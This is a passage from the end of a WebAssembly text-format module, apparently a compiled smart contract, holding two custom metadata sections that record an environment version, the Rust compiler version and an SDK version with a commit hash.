  (@custom "contractenvmetav0" (after data) "\00\00\00\00\00\00\00\19\00\00\00\00")
  (@custom "contractmetav0" (after data) "\00\00\00\00\00\00\00\05rsver\00\00\00\00\00\00\061.98.0\00\00\00\00\00\00\00\00\00\08rssdkver\00\00\00/25.3.2#076083c6fe32ab89660da9eb90f34445eea46079\00")
)
